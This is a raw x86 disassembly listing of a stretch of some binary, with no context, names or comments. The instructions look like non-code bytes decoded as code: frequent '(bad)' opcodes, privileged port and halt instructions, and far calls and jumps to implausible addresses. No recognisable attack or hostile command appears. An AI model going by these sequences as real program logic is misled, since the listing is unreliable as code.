  42365c:	sub    BYTE PTR [ecx-0x1374d7a6],0x4d
  423663:	pop    ecx
  423664:	enter  0xe100,0xa0
  423668:	mov    bl,0x60
  42366a:	mov    ebx,0xf2e2
	...
  4236d3:	add    BYTE PTR [eax],al
  4236d5:	add    BYTE PTR [eax+0x7f747c8f],al
  4236db:	test   DWORD PTR [eax+0x7c916eff],0x6550ed13
  4236e5:	dec    edi
  4236e6:	ret    0x17b
  4236e9:	add    bh,bh
  4236eb:	add    BYTE PTR [eax],al
  4236ed:	add    BYTE PTR [edx],cl
  4236ef:	in     eax,0x1e
  4236f1:	adc    eax,DWORD PTR ds:0x1a6167fe
  4236f7:	jmp    0x2f468490
  4236fc:	push   edx
  4236fd:	mov    eax,edx
  4236ff:	jno    0x4236d2
  423701:	pusha  
  423702:	jg     0x42368e
  423704:	ja     0x4236aa
  423706:	or     eax,0x8bfdb1dc
  42370b:	test   ah,ah
  42370d:	aad    0xb7
  42370f:	adc    ch,BYTE PTR [eax-0x253aaa41]
  423715:	xor    BYTE PTR [edx+0x7b1ddef3],0x63
  42371c:	test   BYTE PTR [ecx],bl
  42371e:	cmp    eax,0x498941f2
  423723:	cdq    
  423724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423725:	xor    ah,al
  423727:	data16 fucomip st,st(7)
  42372a:	inc    esp
  42372b:	mov    bl,BYTE PTR [ecx+0x78]
  42372e:	inc    ebx
  42372f:	xchg   edi,eax
  423730:	cmp    DWORD PTR [ebx+eax*2+0x2e552d9a],0xffffff8d
  423738:	adc    edx,edi
  42373a:	lods   eax,DWORD PTR ds:[esi]
  42373b:	cld    
  42373c:	adc    eax,0x1328142f
  423741:	mov    ds:0x99078ed,eax
  423747:	or     eax,0x18ff0d9a
  42374c:	loope  0x4237c8
  42374e:	sbb    DWORD PTR [edi-0x7976dd55],edi
  423754:	inc    edx
  423755:	call   0x8c5:0x98d1621d
  42375c:	es ja  0x4237b6
  42375f:	cs push ss
  423761:	xchg   ebx,eax
  423762:	mov    ebp,0xd838ae94
  423767:	dec    edi
  423768:	cmp    eax,0xf6ef6d12
  42376d:	sbb    DWORD PTR [edx-0x6b],ecx
  423770:	aam    0xb3
  423772:	(bad)  
  423773:	enter  0x2ced,0x71
  423777:	outs   dx,DWORD PTR ds:[esi]
  423778:	sbb    DWORD PTR [edx+0x31],ebp
  42377b:	jne    0x4237f4
  42377d:	adc    DWORD PTR [eax+0x69],edi
  423780:	fisttp WORD PTR [ebx+0x13561668]
  423786:	hlt    
  423787:	ror    al,1
  423789:	retf   
  42378a:	mov    ah,0xcc
  42378c:	mov    dh,0xb
  42378e:	dec    edx
  42378f:	jb     0x423772
  423791:	sbb    eax,0xd7910ea3
  423796:	test   DWORD PTR ds:0x8846d8fd,esi
  42379c:	adc    al,0xab
  42379e:	mov    DWORD PTR [esp+edi*4-0x7c],ecx
  4237a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237a3:	test   al,0x85
  4237a5:	mov    dh,0xc4
  4237a7:	stos   DWORD PTR es:[edi],eax
  4237a8:	into   
  4237a9:	add    edx,DWORD PTR [edi+edi*2-0xe]
  4237ad:	(bad)  
  4237ae:	lock (bad) 
  4237b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237b1:	push   esi
  4237b2:	xlat   BYTE PTR ds:[ebx]
  4237b3:	sbb    ecx,DWORD PTR [edi]
  4237b5:	loop   0x4237b7
  4237b7:	adc    al,0x2b
  4237b9:	mul    DWORD PTR [edi]
  4237bb:	shr    bh,1
  4237bd:	dec    ecx
  4237be:	pusha  
  4237bf:	cmp    al,0xd7
  4237c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237c2:	mov    BYTE PTR [eax],ch
  4237c4:	out    dx,al
  4237c5:	cs mov edx,0x678d69b
  4237cb:	(bad)  
  4237cc:	icebp  
  4237cd:	mov    edx,DWORD PTR [esi]
  4237cf:	xchg   al,cl
  4237d1:	xchg   ebx,eax
  4237d2:	sahf   
  4237d3:	ins    BYTE PTR es:[edi],dx
  4237d4:	aad    0x3c
  4237d6:	sbb    eax,0xb5809e87
  4237db:	loop   0x42378e
  4237dd:	hlt    
  4237de:	iret   
  4237df:	mov    cl,al
  4237e1:	xchg   esp,eax
  4237e2:	repz cmp edx,DWORD PTR [ecx]
  4237e5:	sbb    eax,0xb7cd7f9e
  4237ea:	mov    esi,0x70cd
	...
  423853:	add    BYTE PTR [eax],al
  423855:	add    BYTE PTR [ebx+eiz*1],dh
  423858:	jo     0x4237f7
  42385a:	ja     0x42383b
  42385c:	std    
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	(bad)  
  42385f:	sbb    edx,esi
  423861:	jmp    0x7cc1:0x830e11a9
  423868:	add    DWORD PTR [eax],eax
  42386a:	inc    DWORD PTR [eax]
  42386c:	add    BYTE PTR [eax],al
  42386e:	test   BYTE PTR [ecx-0x29],0x74
  423872:	mov    ch,bl
  423874:	stc    
  423875:	es pop ebp
  423877:	lods   eax,DWORD PTR ds:[esi]
  423878:	xor    DWORD PTR [ecx-0x53],0x5b
  42387c:	mov    edx,0x4f5d4e5b
  423881:	jo     0x42380f
  423883:	or     ah,BYTE PTR [ecx-0x3c]
  423886:	mov    edx,0x80f5d565
  42388b:	ret    0xc584
  42388e:	(bad)  
  42388f:	iret   
  423890:	popf   
  423891:	pushf  
  423892:	cmp    cl,BYTE PTR [esi-0x541ba573]
  423898:	add    BYTE PTR [ebx],bl
  42389a:	imul   edx,DWORD PTR [edx],0xfc36c61a
  4238a0:	shl    DWORD PTR [eax+ecx*1+0xd],0x5
  4238a5:	jns    0x4238ce
  4238a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238a8:	call   0x43dc:0x18a90288
  4238af:	sub    cl,BYTE PTR [edi-0x15faf468]
  4238b5:	jnp    0x423926
  4238b7:	cld    
  4238b8:	(bad)  
  4238b9:	lods   eax,DWORD PTR ds:[esi]
  4238ba:	mov    ebx,0x74f32d03
  4238bf:	jb     0x423919
  4238c1:	cmp    al,0x5e
  4238c3:	test   BYTE PTR [ecx],bh
  4238c5:	push   ds
  4238c6:	add    al,0x18
  4238c8:	clc    
  4238c9:	lock into 
  4238cb:	pop    es
  4238cc:	xor    ebp,DWORD PTR [edi+0x16ddeb28]
  4238d2:	sub    DWORD PTR [edx],eax
  4238d4:	lea    eax,ds:0x425b5b8b
  4238da:	ja     0x4238b1
  4238dc:	inc    esi
  4238dd:	daa    
  4238de:	ret    
  4238df:	mov    dl,0xae
  4238e1:	sbb    BYTE PTR [ecx],al
  4238e3:	pop    ss
  4238e4:	jo     0x4238fc
  4238e6:	sbb    eax,0x7977d444
  4238eb:	xchg   BYTE PTR [esi-0x3b],bh
  4238ee:	es dec ebp
  4238f0:	xchg   BYTE PTR ds:0x4be0009,cl
  4238f6:	cs jecxz 0x423918
  4238f9:	ds mov ah,0x34
  4238fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238fd:	pop    ebp
  4238fe:	iret   
  4238ff:	fsub   DWORD PTR [edi+ecx*8]
  423902:	nop
  423903:	fwait
  423904:	inc    ecx
  423905:	pusha  
  423906:	call   FWORD PTR [eax+0x25]
  423909:	jg     0x423897
  42390b:	fucomi st,st(4)
  42390d:	xchg   esi,eax
  42390e:	das    
  42390f:	jns    0x423921
  423911:	mov    edi,0x20f7e319
  423916:	lods   al,BYTE PTR ds:[esi]
  423917:	push   ds
  423918:	ins    DWORD PTR es:[edi],dx
  423919:	xchg   edi,eax
  42391a:	xchg   edi,eax
  42391b:	jnp    0x423961
  42391d:	mov    dh,BYTE PTR [esi+0x45afea64]
  423923:	lods   al,BYTE PTR ds:[esi]
  423924:	xchg   DWORD PTR [eax-0x4d7f5a6a],ebp
  42392a:	mov    ecx,0x8578a167
  42392f:	mov    ebp,0xe2c559f0
  423934:	les    esp,FWORD PTR [esi]
  423936:	ins    BYTE PTR es:[edi],dx
  423937:	sub    DWORD PTR ds:0xca15aad,eax
  42393d:	lahf   
  42393e:	push   es
  42393f:	pop    ecx
  423940:	rcl    DWORD PTR [eax],1
  423942:	inc    esp
  423943:	sar    DWORD PTR [esi],0x77
  423946:	stos   BYTE PTR es:[edi],al
  423947:	xchg   ebx,eax
  423948:	inc    edi
  423949:	dec    esi
  42394a:	in     eax,0xba
  42394c:	out    dx,eax
  42394d:	sbb    cl,dh
  42394f:	xchg   esp,eax
  423950:	rcr    DWORD PTR [ebx-0x2d9fa9f1],cl
  423956:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  423958:	inc    ecx
  423959:	jne    0x423975
  42395b:	out    0xbf,al
  42395d:	xchg   ebx,eax
  42395e:	ror    BYTE PTR ds:[ebp-0x5976c3b3],0x7d
  423966:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423967:	cmovge edx,DWORD PTR [eax+esi*2-0x35]
  42396c:	adc    DWORD PTR [eax],eax
	...
  4239d6:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	push   ecx
  4239df:	sbb    eax,0x1cf02bbd
  4239e4:	inc    ebx
  4239e5:	daa    
  4239e6:	sar    BYTE PTR [ebp+0x1],0x0
  4239ea:	inc    DWORD PTR [eax]
  4239ec:	add    BYTE PTR [eax],al
  4239ee:	into   
  4239ef:	sub    al,0xe1
  4239f1:	lahf   
  4239f2:	dec    ecx
  4239f3:	aad    0xd6
  4239f5:	pop    ecx
  4239f6:	out    dx,eax
  4239f7:	jl     0x4239b2
  4239f9:	imul   ebp,ebp,0xffffff8f
  4239fc:	cmp    al,0x4d
  4239fe:	sbb    DWORD PTR [ebx+0x301cb987],0xffffffd8
  423a05:	mov    dh,0xa3
  423a07:	jmp    0x26f2b5ec
  423a0c:	mov    ah,BYTE PTR [eax-0x24c19cdf]
  423a12:	push   ecx
  423a13:	imul   DWORD PTR [ebx]
  423a15:	std    
  423a16:	(bad)  
  423a17:	popf   
  423a18:	and    esi,ecx
  423a1a:	jb     0x423a05
  423a1c:	or     edx,DWORD PTR [edx]
  423a1e:	cmp    esp,DWORD PTR [edx-0x4e1cdeb]
  423a24:	std    
  423a25:	mov    ch,0x94
  423a27:	arpl   dx,si
  423a29:	push   eax
  423a2a:	cmp    bl,BYTE PTR [eax]
  423a2c:	xor    eax,0x884f1875
  423a31:	fld    DWORD PTR [edi]
  423a33:	push   ebp
  423a34:	mov    dl,0x97
  423a36:	call   0xdd64:0x26e3f
  423a3d:	call   0x1239:0xa5d6a4cb
  423a44:	jbe    0x423a60
  423a46:	inc    edx
  423a47:	jae    0x423a3a
  423a49:	cmp    DWORD PTR [eax+0x4144f26b],esi
  423a4f:	xchg   ecx,eax
  423a50:	arpl   WORD PTR [eax+0x70],bp
  423a53:	outs   dx,DWORD PTR ds:[esi]
  423a54:	push   esp
  423a55:	addr16 cmp ecx,ecx
  423a58:	shr    BYTE PTR [esi],0x8
  423a5b:	clc    
  423a5c:	retf   
  423a5d:	aad    0xcf
  423a5f:	push   cs
  423a60:	push   esi
  423a61:	in     al,0x8f
  423a63:	test   al,0x4b
  423a65:	inc    esi
  423a66:	mov    eax,ds:0x80a9dda1
  423a6b:	mov    dl,0x53
  423a6d:	vpsraw ymm2,ymm5,XMMWORD PTR [ecx+ebx*8-0x58dded37]
  423a76:	or     ecx,DWORD PTR [edx+0x1b824362]
  423a7c:	jle    0x423aec
  423a7e:	push   edx
  423a7f:	and    DWORD PTR ds:0x5bd617ba,edi
  423a85:	xchg   ebp,eax
  423a86:	add    ch,bh
  423a88:	or     ebx,DWORD PTR [eax+edx*1]
  423a8b:	pop    edi
  423a8c:	imul   esp,DWORD PTR [esi+0x22],0x47
  423a90:	shl    BYTE PTR [edx],1
  423a92:	les    ebx,FWORD PTR [esi+0xcae9f30]
  423a98:	(bad)  
  423a99:	out    dx,eax
  423a9a:	cmp    al,0x39
  423a9c:	out    dx,al
  423a9d:	shl    BYTE PTR [ecx+0x60d70dc7],1
  423aa3:	ss mov al,0x52
  423aa6:	(bad)  
  423aa7:	fisubr WORD PTR [ebx+0x3c05e77a]
  423aad:	idiv   ah
  423aaf:	je     0x423b1b
  423ab1:	push   cs
  423ab2:	jb     0x423b22
  423ab4:	mov    eax,ds:0x106aaeef
  423ab9:	sub    DWORD PTR [ecx],edi
  423abb:	jmp    0x423a65
  423abd:	adc    edx,0xd7a1ee06
  423ac3:	push   es
  423ac4:	repz je 0x423ac8
  423ac7:	sahf   
  423ac8:	dec    esp
  423ac9:	push   cs
  423aca:	sbb    ecx,DWORD PTR [esi-0xf]
  423acd:	pop    eax
  423ace:	sbb    eax,0xc946aa5a
  423ad3:	or     edx,DWORD PTR [edi-0x7a2fb597]
  423ad9:	adc    BYTE PTR [esi],dh
  423adb:	aad    0x47
  423add:	jmp    0x423aeb
  423adf:	push   ebp
  423ae0:	imul   DWORD PTR [ebx]
  423ae2:	push   esi
  423ae3:	mov    ch,0xef
  423ae5:	add    BYTE PTR ds:0x6cf9c1a1,0x4e
  423aec:	loopne 0x423aee
	...
  423b56:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423b5c:	cli    
  423b5d:	mov    edi,0x60851ed8
  423b62:	jne    0x423b79
  423b64:	stos   DWORD PTR es:[edi],eax
  423b65:	bound  edi,QWORD PTR [edi-0xfffe82]
  423b6b:	add    BYTE PTR [eax],al
  423b6d:	add    BYTE PTR [edx+0x5de5a85e],al
  423b73:	retf   
  423b74:	jne    0x423b09
  423b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b77:	mov    BYTE PTR [bx+di],dh
  423b7a:	imul   edi,DWORD PTR [eax],0xffffffbc
  423b7d:	sbb    DWORD PTR [ecx],ecx
  423b7f:	imul   ebp,DWORD PTR [edx-0x3dddfa2e],0x4f
  423b86:	fild   QWORD PTR [ecx+0x7c]
  423b89:	inc    edi
  423b8a:	jl     0x423b49
  423b8c:	addr16 xchg ebx,eax
  423b8e:	push   ecx
  423b8f:	test   eax,0xfe32c082
  423b94:	jne    0x423bb0
  423b96:	call   0x303056ea
  423b9b:	fsub   QWORD PTR ds:0x874b4b65
  423ba1:	sbb    edx,DWORD PTR [edi]
  423ba3:	and    BYTE PTR [edi-0x7622737d],dl
  423ba9:	adc    ah,BYTE PTR [ecx]
  423bab:	push   edi
  423bac:	jle    0x423b96
  423bae:	sbb    BYTE PTR [eax+0x7a],bl
  423bb1:	imul   edx,eax,0xb42b6416
  423bb7:	sub    al,0xaa
  423bb9:	imul   eax,DWORD PTR [ebp-0x1176bc27],0x85c3df28
  423bc3:	in     al,0xae
  423bc5:	lods   al,BYTE PTR ds:[esi]
  423bc6:	push   ebx
  423bc7:	lfs    ebx,FWORD PTR [ebx+0x7b]
  423bcb:	addr16 fs jmp 0x45ff:0x8695a0ff
  423bd4:	mov    edx,0x19728383
  423bd9:	scas   al,BYTE PTR es:[edi]
  423bda:	imul   ebx,DWORD PTR [ebp+0x2fc62590],0xd65279ef
  423be4:	jl     0x423c4a
  423be6:	push   esp
  423be7:	adc    al,0xfb
  423be9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bea:	cli    
  423beb:	aad    0x94
  423bed:	push   edi
  423bee:	cli    
  423bef:	jl     0x423be2
  423bf1:	fdiv   DWORD PTR [ecx]
  423bf3:	pushf  
  423bf4:	inc    ecx
  423bf5:	daa    
  423bf6:	push   edx
  423bf7:	push   0x949ca348
  423bfc:	es imul edx,esp,0xffffffda
  423c00:	loop   0x423c47
  423c02:	ja     0x423c51
  423c04:	stos   BYTE PTR es:[edi],al
  423c05:	and    al,BYTE PTR [edx+edi*1]
  423c08:	mov    ecx,0x889f769c
  423c0d:	xor    DWORD PTR [eax-0x5c],edx
  423c10:	dec    eax
  423c11:	out    0x45,eax
  423c13:	outs   dx,BYTE PTR ds:[esi]
  423c14:	das    
  423c15:	and    ebx,DWORD PTR [eax+edi*1-0x6]
  423c19:	mov    eax,ds:0x74407648
  423c1e:	and    BYTE PTR [ebp+0x64b8b37a],cl
  423c24:	arpl   WORD PTR [eax-0x31],si
  423c27:	cmp    edx,ecx
  423c29:	clc    
  423c2a:	stc    
  423c2b:	imul   ecx,DWORD PTR [esi+0x8008bc9],0x76dc999
  423c35:	fidivr DWORD PTR [ebx-0x4a844e1e]
  423c3b:	leave  
  423c3c:	retf   
  423c3d:	in     al,dx
  423c3e:	mov    gs,WORD PTR [ecx+0x47804a83]
  423c44:	sub    eax,0x24c5670a
  423c49:	push   edi
  423c4a:	xchg   BYTE PTR [esi-0x18],ah
  423c4d:	sub    al,BYTE PTR ds:0x6f0a4b1f
  423c53:	ficomp DWORD PTR [eax+0x2b]
  423c56:	mov    es,WORD PTR ds:0xa26fbb26
  423c5c:	inc    esi
  423c5d:	in     al,0xa2
  423c5f:	pop    es
  423c60:	or     eax,0x7f7b3f0c
  423c65:	sahf   
  423c66:	sub    BYTE PTR [edx+0x41],al
  423c69:	test   BYTE PTR [ecx+0xc],ah
  423c6c:	pop    esp
	...
  423cd5:	add    ch,bh
  423cd7:	(bad)  
  423cd8:	test   eax,0xff57ab46
  423cdd:	call   FWORD PTR [eax-0x58bb99e9]
  423ce3:	sub    edx,DWORD PTR [ecx+edx*1+0x17fbe]
  423cea:	inc    DWORD PTR [eax]
  423cec:	add    BYTE PTR [eax],al
  423cee:	daa    
  423cef:	push   ebp
  423cf0:	mov    ds:0xf5c9ed95,al
  423cf5:	or     ch,BYTE PTR [eax+ebp*2]
  423cf8:	mov    ecx,0xb14f843e
  423cfd:	fucomip st,st(5)
  423cff:	jle    0x423d2b
  423d01:	jo     0x423c9d
  423d03:	cmp    eax,0x69b328bd
  423d08:	xchg   edi,eax
  423d09:	sahf   
  423d0a:	add    DWORD PTR [ebx+eiz*2-0x5c32d474],ebx
  423d11:	sahf   
  423d12:	add    eax,0xbe22234a
  423d17:	inc    ecx
  423d18:	inc    esi
  423d19:	dec    eax
  423d1a:	or     BYTE PTR [edx-0x6eed1777],bl
  423d20:	aas    
  423d21:	neg    BYTE PTR [eax+0x742e5bd1]
  423d27:	loope  0x423d08
  423d29:	repz test al,0x88
  423d2c:	in     eax,0xe8
  423d2e:	test   BYTE PTR [eax],al
  423d30:	in     al,dx
  423d31:	mov    ch,0x41
  423d33:	data16 in al,0x61
  423d36:	mov    ch,0x4f
  423d38:	mov    eax,0x98296534
  423d3d:	jno    0x423ced
  423d3f:	repnz push ds
  423d41:	enter  0xa1ee,0x7
  423d45:	inc    ecx
  423d46:	cmp    al,0xaa
  423d48:	mov    bl,0x7
  423d4a:	ror    DWORD PTR [esi-0x7343932e],cl
  423d50:	test   al,0x68
  423d52:	(bad)  
  423d53:	mov    esi,DWORD PTR [eax+0x5ddc5c08]
  423d59:	jecxz  0x423d92
  423d5b:	(bad)  
  423d5c:	retf   
  423d5d:	(bad)  
  423d5e:	in     eax,0xf7
  423d60:	dec    esi
  423d61:	sub    BYTE PTR [ebx],bl
  423d63:	fisttp QWORD PTR [ebx]
  423d65:	push   ecx
  423d66:	in     eax,dx
  423d67:	shl    edx,0x80
  423d6a:	jno    0x423dc8
  423d6c:	pop    esp
  423d6d:	cmp    BYTE PTR [esi-0x7b],dl
  423d70:	adc    ebp,DWORD PTR [esp+ebx*8+0x2d]
  423d74:	mov    bl,0x76
  423d76:	xlat   BYTE PTR ds:[ebx]
  423d77:	push   eax
  423d78:	push   ss
  423d79:	or     al,0x93
  423d7b:	pop    ecx
  423d7c:	js     0x423dfb
  423d7e:	sub    dl,BYTE PTR ds:0x14deeb61
  423d84:	ucomiss xmm4,DWORD PTR [ecx+0x19]
  423d88:	xchg   ebx,eax
  423d89:	jle    0x423d99
  423d8b:	or     cl,BYTE PTR [esi-0x7a]
  423d8e:	add    ebx,DWORD PTR [ebx]
  423d90:	enter  0x892d,0x95
  423d94:	enter  0x8722,0xbb
  423d98:	aad    0xa2
  423d9a:	mov    ?,esp
  423d9c:	inc    ebx
  423d9d:	adc    DWORD PTR [edi],ebp
  423d9f:	push   eax
  423da0:	or     ebx,DWORD PTR [edx-0x4a]
  423da3:	ins    DWORD PTR es:[edi],dx
  423da4:	mov    DWORD PTR [ecx],edx
  423da6:	outs   dx,BYTE PTR ds:[esi]
  423da7:	push   esp
  423da8:	push   edi
  423da9:	sub    eax,0x2e31428
  423dae:	je     0x423e2a
  423db0:	clc    
  423db1:	inc    ecx
  423db2:	lahf   
  423db3:	inc    edx
  423db4:	sub    al,0x55
  423db6:	test   al,bl
  423db8:	int3   
  423db9:	jns    0x423e2f
  423dbb:	cmp    eax,0x1ff8ee47
  423dc0:	push   es
  423dc1:	icebp  
  423dc2:	pop    esi
  423dc3:	add    cl,BYTE PTR [esi-0x68221a9f]
  423dc9:	js     0x423e2b
  423dcb:	jo     0x423e0a
  423dcd:	stc    
  423dce:	aas    
  423dcf:	(bad)  
  423dd0:	sbb    BYTE PTR [esi+eiz*2-0x1143564f],dh
  423dd7:	stos   BYTE PTR es:[edi],al
  423dd8:	test   BYTE PTR ds:0xef900609,ah
  423dde:	out    0x1e,eax
  423de0:	jge    0x423ddf
  423de2:	dec    ebp
  423de3:	add    edi,DWORD PTR [esi-0x16b728c5]
  423de9:	push   edx
  423dea:	adc    eax,0xf0e3
	...
  423e53:	add    BYTE PTR [eax],al
  423e55:	add    BYTE PTR [edx-0xa],ah
  423e58:	xchg   DWORD PTR [ecx],ecx
  423e5a:	xchg   edi,eax
  423e5b:	jns    0x423e4b
  423e5d:	jmp    DWORD PTR [edi]
  423e5f:	mov    DWORD PTR [eax+0x22395dd2],esp
  423e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e66:	mov    ebp,0xff000180
  423e6b:	add    BYTE PTR [eax],al
  423e6d:	add    BYTE PTR [edx+0x2],ah
  423e70:	and    dh,al
  423e72:	pop    ebp
  423e73:	fwait
  423e74:	mov    al,ds:0x5ad7ecad
  423e79:	and    DWORD PTR [edx+0x7c2d1a39],edx
  423e7f:	stos   BYTE PTR es:[edi],al
  423e80:	retf   
  423e81:	jge    0x423eff
  423e83:	xchg   ecx,eax
  423e84:	mov    ebp,0xde2993d
  423e89:	test   eax,0x68e1f9fb
  423e8e:	inc    edx
  423e8f:	pop    es
  423e90:	inc    ebx
  423e91:	dec    eax
  423e92:	jns    0x423e92
  423e94:	xchg   edi,eax
  423e95:	or     al,0xda
  423e97:	push   ebx
  423e98:	fbld   TBYTE PTR [esi+0x46873c7c]
  423e9e:	rol    DWORD PTR ds:0x95d6fc02,1
  423ea4:	scas   al,BYTE PTR es:[edi]
  423ea5:	xchg   DWORD PTR [eax+0x148490d9],edx
  423eab:	sar    BYTE PTR [ebp-0x1e],cl
  423eae:	int    0x7e
  423eb0:	ret    
  423eb1:	fldpi  
  423eb3:	and    cl,dl
  423eb5:	les    esi,FWORD PTR [eax+0x3664cca1]
  423ebb:	stos   BYTE PTR es:[edi],al
  423ebc:	hlt    
  423ebd:	inc    ecx
  423ebe:	mov    al,cl
  423ec0:	ss es cld 
  423ec3:	or     BYTE PTR [edi+0x2404d5de],bh
  423ec9:	mov    dl,0x5b
  423ecb:	pop    ds
  423ecc:	cs loope 0x423ea7
  423ecf:	ja     0x423ecf
  423ed1:	fs adc ah,dl
  423ed4:	push   0xf84f59ca
  423ed9:	js     0x423f02
  423edb:	mov    dl,0x8a
  423edd:	xor    BYTE PTR [edx],ah
  423edf:	es push es
  423ee1:	hlt    
  423ee2:	pusha  
  423ee3:	lahf   
  423ee4:	stos   DWORD PTR es:[edi],eax
  423ee5:	dec    esp
  423ee6:	and    BYTE PTR [eax-0xfb18911],dl
  423eec:	jno    0x423e9b
  423eee:	jp     0x423f15
  423ef0:	xor    DWORD PTR [edi],ebx
  423ef2:	xchg   esp,eax
  423ef3:	pop    ebx
  423ef4:	pusha  
  423ef5:	retf   
  423ef6:	sti    
  423ef7:	test   esp,eax
  423ef9:	inc    edx
  423efa:	jns    0x423ed1
  423efc:	clc    
  423efd:	(bad)  
  423efe:	cmp    eax,0x3e402465
  423f03:	add    eax,0xb2e90dfc
  423f08:	mov    ebx,?
  423f0a:	sub    edi,DWORD PTR [edx+0x12197ba]
  423f10:	daa    
  423f11:	shr    DWORD PTR [esi+0x68580ab8],1
  423f17:	mov    ds:0x65eee21a,al
  423f1c:	inc    ebp
  423f1d:	pushf  
  423f1e:	pop    ss
  423f1f:	fst    QWORD PTR [eax-0x317dfd37]
  423f25:	ds dec ebp
  423f27:	adc    al,0x7b
  423f29:	jno    0x423f18
  423f2b:	imul   ebp,DWORD PTR [edx],0x16351ec9
  423f31:	sub    al,0xb9
  423f33:	js     0x423ed0
  423f35:	addr16 adc al,0x73
  423f38:	xchg   BYTE PTR [edi-0xeff332e],bh
  423f3e:	xlat   BYTE PTR ds:[ebx]
  423f3f:	and    bl,ch
  423f41:	imul   ecx,DWORD PTR [ebx+0x7ddb4944],0x1fc60b24
  423f4b:	mov    bl,0x2c
  423f4d:	sahf   
  423f4e:	mov    ds:0xcf1b0583,al
  423f53:	mov    esp,eax
  423f55:	jmp    0x55c44703
  423f5a:	lods   al,BYTE PTR ds:[esi]
  423f5b:	enter  0x3429,0xa0
  423f5f:	and    eax,0xdb664f29
  423f64:	xchg   esp,eax
  423f65:	xor    BYTE PTR [ebx+0x70],al
  423f68:	stos   DWORD PTR es:[edi],eax
  423f69:	jno    0x423fb9
  423f6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f6c:	xchg   BYTE PTR [eax],al
	...
  423fd6:	scas   al,BYTE PTR es:[edi]
  423fd7:	call   0x9fff:0xff74b964
  423fde:	adc    al,0x96
  423fe0:	sbb    al,0xd9
  423fe2:	dec    esi
  423fe3:	pop    ds
  423fe4:	ins    BYTE PTR es:[edi],dx
  423fe5:	mov    esp,0x181bc
  423fea:	inc    DWORD PTR [eax]
  423fec:	add    BYTE PTR [eax],al
  423fee:	outs   dx,DWORD PTR ds:[esi]
  423fef:	jge    0x423fba
  423ff1:	ds adc al,0x83
  423ff4:	je     0x424056
  423ff6:	adc    dl,BYTE PTR [ebp-0x1f]
  423ff9:	dec    edi
  423ffa:	fwait
  423ffb:	mov    ch,bh
  423ffd:	fisubr WORD PTR [ecx-0x6d4972b1]
  424003:	mov    bl,0xdb
  424005:	cmp    dh,BYTE PTR [esi+0x1d]
  424008:	stos   BYTE PTR es:[edi],al
  424009:	sti    
  42400a:	mov    cs,WORD PTR [esi+edi*4]
  42400d:	cdq    
  42400e:	fst    QWORD PTR [edx+0x3624e98e]
  424014:	ins    DWORD PTR es:[edi],dx
  424015:	jmp    0x423fa9
  424017:	xlat   BYTE PTR ds:[ebx]
  424018:	mov    bl,0xc9
  42401a:	out    0xff,eax
  42401c:	jg     0x42400c
  42401e:	retf   0xa0fa
  424021:	add    edi,DWORD PTR [esi-0x3947943]
  424027:	test   BYTE PTR [ebp+eax*8-0x1d],dh
  42402b:	(bad)  
  42402c:	push   esi
  42402d:	mov    esp,0x37b6b45
  424032:	xor    al,0xcd
  424034:	jecxz  0x42409b
  424036:	adc    bl,dh
  424038:	dec    esp
  424039:	lea    edi,[ecx+0x4f37961a]
  42403f:	mov    dl,0x18
  424041:	xchg   esi,eax
  424042:	lods   eax,DWORD PTR ds:[esi]
  424043:	dec    BYTE PTR [edi-0x42]
  424046:	jl     0x423fd9
  424048:	rcr    DWORD PTR [esi+edi*8+0x7b],cl
  42404c:	(bad)  
  42404d:	aaa    
  42404e:	add    DWORD PTR [ebx+0x19],0x10
  424052:	xor    ah,dh
  424054:	lahf   
  424055:	retf   0x9f2b
  424058:	(bad)  
  424059:	std    
  42405a:	fdivr  QWORD PTR [ebx]
  42405c:	inc    ecx
  42405d:	dec    ebx
  42405e:	xchg   edx,eax
  42405f:	and    DWORD PTR [eax],ebp
  424061:	pop    ss
  424062:	lea    esi,[ebx]
  424064:	jae    0x424052
  424066:	mov    eax,0x319aa23d
  42406b:	adc    BYTE PTR [eax+eax*8-0x16],0xa5
  424070:	ja     0x424028
  424072:	push   edi
  424073:	ficomp WORD PTR [eax+0x3e26de9b]
  424079:	add    BYTE PTR [eax+0xc3e8f96],al
  42407f:	repz mov edx,0xefda7aae
  424085:	sub    ecx,ebp
  424087:	imul   cx,dx,0x54
  42408b:	push   ebx
  42408c:	inc    eax
  42408d:	sub    eax,0x32939248
  424092:	xor    edi,DWORD PTR [edi+0x4aaca9ac]
  424098:	mov    cl,0xc7
  42409a:	mov    edx,0x6c2d7bb5
  42409f:	icebp  
  4240a0:	pusha  
  4240a1:	iret   
  4240a2:	imul   eax,DWORD PTR [ecx+0x3],0xffffffcf
  4240a6:	inc    esp
  4240a7:	cmc    
  4240a8:	les    edx,FWORD PTR [esi+0x14878a92]
  4240ae:	mov    dl,ch
  4240b0:	in     eax,dx
  4240b1:	arpl   cx,bp
  4240b3:	add    edi,edx
  4240b5:	mov    ah,0x52
  4240b7:	mov    ah,0xa7
  4240b9:	ins    DWORD PTR es:[edi],dx
  4240ba:	mov    ebx,0xd389ba78
  4240bf:	and    BYTE PTR es:[edi+ecx*1+0x68],dh
  4240c4:	addr16 push ss
  4240c6:	loopne 0x42411c
  4240c8:	aas    
  4240c9:	and    DWORD PTR ds:0x9e5af77f,0x55
  4240d0:	fistp  WORD PTR [esi]
  4240d2:	and    BYTE PTR [ecx],ah
  4240d4:	xchg   ecx,eax
  4240d5:	fsubr  DWORD PTR [esi]
  4240d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240d8:	lods   al,BYTE PTR ds:[esi]
  4240d9:	jns    0x424157
  4240db:	in     al,0x30
  4240dd:	loopne 0x4240ba
  4240df:	add    ebx,edi
